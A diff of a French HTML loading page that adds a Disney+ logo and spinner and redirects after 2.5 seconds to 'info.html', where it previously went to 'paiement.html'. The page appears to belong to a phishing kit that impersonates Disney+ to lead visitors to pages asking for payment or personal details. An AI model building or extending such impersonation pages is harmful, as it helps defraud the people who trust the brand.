@@ -5,29 +5,50 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Chargement...</title>
   <style>
-    /* Centrage et fond noir */
     body, html {
-      margin: 0; padding: 0; height: 100%;
+      margin: 0;
+      padding: 0;
+      height: 100%;
       background-color: #000;
       display: flex;
       justify-content: center;
       align-items: center;
+      position: relative;
     }
-    .loader img {
-      width: 150px; /* ajuste la taille si besoin */
-      height: auto;
-      display: block;
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255, 255, 255, 0.1);
+      border-top: 5px solid #00aaff; /* couleur Disney+ */
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 100px;
+      opacity: 0.9;
     }
   </style>
 </head>
 <body>
-  <div class="loader">
-    <img src="Images/loader2.gif" alt="Chargement..." />
-  </div>
+  <!-- Logo Disney+ en haut à gauche -->
+  <img src="Images/compose2.png" alt="Disney+" class="logo">
+
+  <!-- Cercle de chargement au centre -->
+  <div class="spinner"></div>
 
   <script>
     setTimeout(() => {
-      window.location.href = "paiement.html";
+      window.location.href = "info.html";
     }, 2500);
   </script>
 </body>
